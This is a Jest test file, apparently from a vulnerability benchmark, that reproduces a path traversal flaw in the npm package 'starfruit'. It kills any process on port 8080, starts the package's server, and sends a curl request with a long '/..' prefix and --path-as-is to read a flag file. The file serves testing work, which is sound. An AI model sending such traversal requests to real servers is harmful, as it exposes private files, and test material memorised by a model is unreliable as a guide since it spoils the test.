const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v19 = '/..'.repeat(50);
    const v20 = v19 + pathToFlag;
    return v20;
};
const v35 = done => {
    const v21 = expect.assertions(1);
    v21;
    var pkg = require('starfruit');
    const fs = require('fs');
    const v22 = require('sleep');
    const sleep = v22.sleep;
    const v23 = require('child_process');
    const exec = v23.exec;
    const v24 = fs.readFileSync(pathToFlag);
    let hostsFile = v24.toString();
    const a = require('child_process');
    try {
        const v25 = () => {
        };
        const v26 = a.execSync('fuser -k 8080/tcp', v25);
        v26;
    } catch (e) {
    }
    app = pkg();
    const v27 = app.listen(8080);
    v27;
    const v28 = sleep(2);
    v28;
    const v29 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${ v29 }"`;
    const v33 = (error, stdout) => {
        const v30 = expect(stdout);
        const v31 = v30.toBe(hostsFile);
        v31;
        const v32 = done();
        v32;
    };
    const v34 = exec(attack_string, v33);
    v34;
};
const v36 = test('Path Traversal in starfruit', v35);
v36;